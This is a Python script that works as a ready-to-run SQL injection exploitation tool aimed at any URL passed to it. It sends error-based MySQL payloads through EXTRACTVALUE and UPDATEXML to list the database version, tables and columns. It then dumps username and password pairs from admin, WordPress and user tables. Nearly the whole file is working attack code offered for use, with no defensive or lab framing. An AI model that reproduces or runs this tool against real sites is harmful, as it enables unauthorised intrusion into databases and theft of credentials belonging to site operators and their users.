#!/usr/bin/env python3
"""
FIXED SQL Injection Exploiter - Correct Data Extraction
"""

import requests
import time
import sys
import re
import urllib.parse

class FixedSQLiExploiter:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.verify = False
        
    def log(self, message):
        timestamp = time.strftime("%H:%M:%S")
        print(f"[{timestamp}] {message}")
    
    def smart_extract(self, payload):
        """SMART data extraction - only returns real SQL data"""
        try:
            url = f"{self.target}{payload}"
            response = self.session.get(url, timeout=10)
            
            # ONLY extract from proper MySQL error messages
            patterns = [
                r"XPATH syntax error: '([^']+)'",
                r"XPATH.*?: '([^']+)'",
                r"SQLSTATE.*?'([^']+)'",
            ]
            
            for pattern in patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    extracted = match.group(1)
                    # FILTER OUT HTML/JS code
                    if any(bad in extracted for bad in ['data-toggle', 'script', 'function', 'var ', 'css', 'html', '<', '>', '{', '}']):
                        continue
                    if 2 < len(extracted) < 500:
                        return extracted
            
            return None
        except Exception as e:
            return None
    
    def get_database_info(self):
        """GET DATABASE INFORMATION"""
        self.log("üéØ EXTRACTING DATABASE INFORMATION...")
        
        # Get MySQL Version
        payload = "' AND EXTRACTVALUE(1, CONCAT(0x3a, VERSION()))--"
        version = self.smart_extract(payload)
        if version:
            self.log(f"‚úÖ MYSQL VERSION: {version}")
        else:
            self.log("‚ùå Failed to get version - trying alternative...")
            payload = "' AND UPDATEXML(1, CONCAT(0x3a, VERSION()), 1)--"
            version = self.smart_extract(payload)
            if version:
                self.log(f"‚úÖ MYSQL VERSION: {version}")
        
        # Get Database Name
        payload = "' AND EXTRACTVALUE(1, CONCAT(0x3a, DATABASE()))--"
        db_name = self.smart_extract(payload)
        if db_name:
            self.log(f"‚úÖ DATABASE NAME: {db_name}")
            return db_name
        else:
            self.log("‚ùå Failed to get database name - trying alternative...")
            payload = "' AND UPDATEXML(1, CONCAT(0x3a, DATABASE()), 1)--"
            db_name = self.smart_extract(payload)
            if db_name:
                self.log(f"‚úÖ DATABASE NAME: {db_name}")
                return db_name
        
        return None
    
    def get_tables_direct(self, db_name):
        """GET TABLES USING DIRECT TECHNIQUES"""
        self.log(f"üìä EXTRACTING TABLES FROM {db_name}...")
        
        # Method 1: EXTRACTVALUE
        payload = f"' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db_name}')))--"
        tables = self.smart_extract(payload)
        
        if tables and len(tables) > 3:
            table_list = tables.split(',')
            self.log(f"‚úÖ FOUND {len(table_list)} TABLES:")
            for i, table in enumerate(table_list, 1):
                self.log(f"   {i}. {table}")
            return table_list
        
        # Method 2: UPDATEXML
        self.log("Trying UPDATEXML method...")
        payload = f"' AND UPDATEXML(1, CONCAT(0x3a, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db_name}')), 1)--"
        tables = self.smart_extract(payload)
        
        if tables and len(tables) > 3:
            table_list = tables.split(',')
            self.log(f"‚úÖ FOUND {len(table_list)} TABLES:")
            for i, table in enumerate(table_list, 1):
                self.log(f"   {i}. {table}")
            return table_list
        
        self.log("‚ùå Could not extract tables")
        return []
    
    def quick_credential_dump(self):
        """QUICK DIRECT CREDENTIAL DUMPING"""
        self.log("üî• QUICK CREDENTIAL SEARCH...")
        
        # Try to directly dump admin credentials
        payloads = [
            # Direct admin user search
            "' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT CONCAT(username, ':', password) FROM admins LIMIT 1)))--",
            "' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT CONCAT(user_login, ':', user_pass) FROM wp_users LIMIT 1)))--",
            "' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT CONCAT(username, ':', password) FROM users LIMIT 1)))--",
            "' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT CONCAT(name, ':', pass) FROM admin LIMIT 1)))--",
            
            # Try to find any user table
            "' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%user%' LIMIT 1)))--",
            "' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%admin%' LIMIT 1)))--",
        ]
        
        for payload in payloads:
            result = self.smart_extract(payload)
            if result and len(result) > 3:
                self.log(f"üéØ CREDENTIALS FOUND: {result}")
                return result
        
        self.log("‚ùå No credentials found with quick method")
        return None
    
    def exploit_smart(self):
        """SMART EXPLOITATION - FOCUS ON WHAT WORKS"""
        self.log("üöÄ STARTING SMART SQL INJECTION EXPLOITATION")
        self.log("=" * 70)
        
        # First: Quick credential dump
        self.quick_credential_dump()
        
        # Second: Get database info
        self.log("\nüîß GETTING DATABASE INFORMATION...")
        db_name = self.get_database_info()
        
        if db_name:
            # Third: Get tables
            self.log(f"\nüìä GETTING TABLES FROM {db_name}...")
            tables = self.get_tables_direct(db_name)
            
            if tables:
                # Fourth: Try to dump from each user-like table
                user_tables = [t for t in tables if any(keyword in t.lower() for keyword in ['user', 'admin', 'customer'])]
                
                for table in user_tables:
                    self.log(f"\nüéØ DUMPING FROM TABLE: {table}")
                    
                    # Try to get columns
                    payload = f"' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}')))--"
                    columns = self.smart_extract(payload)
                    
                    if columns:
                        self.log(f"üìã COLUMNS: {columns}")
                        column_list = columns.split(',')
                        
                        # Look for username and password columns
                        user_col = next((c for c in column_list if any(k in c.lower() for k in ['user', 'name', 'login'])), None)
                        pass_col = next((c for c in column_list if any(k in c.lower() for k in ['pass', 'pwd'])), None)
                        
                        if user_col and pass_col:
                            self.log(f"üî• FOUND CREDENTIAL COLUMNS: {user_col}, {pass_col}")
                            
                            # Dump first 3 rows
                            for i in range(3):
                                payload = f"' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT CONCAT({user_col}, ' : ', {pass_col}) FROM {table} LIMIT {i},1)))--"
                                creds = self.smart_extract(payload)
                                if creds:
                                    self.log(f"   üîì {creds}")
        
        self.log("=" * 70)
        self.log("üéØ EXPLOITATION COMPLETED")

def main():
    if len(sys.argv) != 2:
        print("FIXED SQL Injection Exploitation Tool")
        print("Usage: python3 fixed_exploit.py <TARGET_URL>")
        print("Example: python3 fixed_exploit.py \"https://example.com/?id=1\"")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    if '?' not in target_url:
        target_url += "?id=1"
    
    exploiter = FixedSQLiExploiter(target_url)
    exploiter.exploit_smart()

if __name__ == "__main__":
    main()